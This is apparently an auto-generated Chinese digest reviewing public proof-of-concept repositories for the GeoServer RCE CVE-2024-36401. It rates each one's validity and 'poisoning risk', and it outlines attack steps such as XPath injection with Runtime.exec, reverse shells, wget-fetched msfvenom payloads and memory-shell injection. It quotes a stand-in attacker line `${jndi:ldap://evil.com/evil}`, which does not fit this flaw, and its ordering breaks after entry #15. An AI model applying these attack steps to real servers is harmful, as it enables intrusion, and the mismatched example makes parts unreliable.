
## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

